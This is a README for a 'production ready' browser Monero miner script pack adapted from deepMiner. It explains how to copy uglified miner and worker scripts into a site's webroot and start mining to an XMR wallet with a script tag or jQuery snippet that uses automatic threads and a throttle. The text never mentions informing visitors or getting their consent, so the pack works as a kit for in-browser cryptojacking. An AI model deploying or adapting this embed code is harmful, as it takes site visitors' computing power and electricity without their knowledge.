# Production ready XMR browser miner script pack

from:
```acsii
:::::::-.  .,:::::: .,::::::::::::::::. .        :   ::::::.    :::..,:::::: :::::::..
 ;;,   `';,;;;;'''' ;;;;'''' `;;;```.;;;;;,.    ;;;  ;;;`;;;;,  `;;;;;;;'''' ;;;;``;;;;
 `[[     [[ [[cccc   [[cccc   `]]nnn]]' [[[[, ,[[[[, [[[  [[[[[. '[[ [[cccc   [[[,/[[['
  $$,    $$ $$""""   $$""""    $$$""    $$$$$$$$"$$$ $$$  $$$ "Y$c$$ $$""""   $$$$$$c
  888_,o8P' 888oo,__ 888oo,__  888o     888 Y88" 888o888  888    Y88 888oo,__ 888b "88bo,
  MMMMP"`   """"YUMMM""""YUMMM YMMMb    MMM  M'  "MMMMMM  MMM     YM """"YUMMMMMMM   "W"

  deepMiner (idea from coinhive.js)
  Worker for own Pool or personal XMR Wallet
  By evil7@deePwn

----------------------------------------------------------------------------------------
```


## Usage

* Copy uglified scripts (preserve structure) to webroot dir your site:
```acsii
xmrMiner-scriptPack.git
.
|-- dm.js (miner)
|__ w.js  (worker - load wasm or js crypt)
    lib
    |-- cn.wasm    (fast wasm version)
    |-- cna.js     (for unsupported wasm browsers)
    |__ cna.js.mem (for unsupported wasm browsers)
    
```

* Replace 'localhost' at first line w.js to your site domain.

* Add some javascript and write like this :
```html
<script src="/dm.js"></script>
<script>
    deepMiner.Anonymous('xmr_addr').start();
</script>
```
- OR if jQuery used, add to any script:
```javascript
$.getScript('/dm.js', function(){
    var m = new deepMiner.Anonymous('xmr_addr',{autoThreads: true});
    m.start();
    m.setThrottle(0.5);
});
```


## API

Same like this: <https://coinhive.com/documentation/miner> (JUST javascript API)


## Example

<http://www.okchain.ru/demo.html>


## Source

```acsii
xmrMiner-scriptPack.git
.
|-- README.md
|-- LICENSE
|__ web
    |-- deepMiner.js (source)
    |-- dm.js (uglified deepMiner.js)
    |-- demo.html
    |-- lib
    |   |-- cryptonight-asmjs.js (source)
    |   |-- cna.js (uglified cryptonight-asmjs.js)
    |   |-- cna.js.mem
    |   |__ cn.wasm
    |__ worker.js (source)
    |__ w.js (uglified worker.js)
```


## License

MIT <https://raw.githubusercontent.com/mixartemev/xmrMiner-scriptPack/master/LICENSE>


## Missions

Building a WebUI. Manage about miner status and banned rules pool setting or something
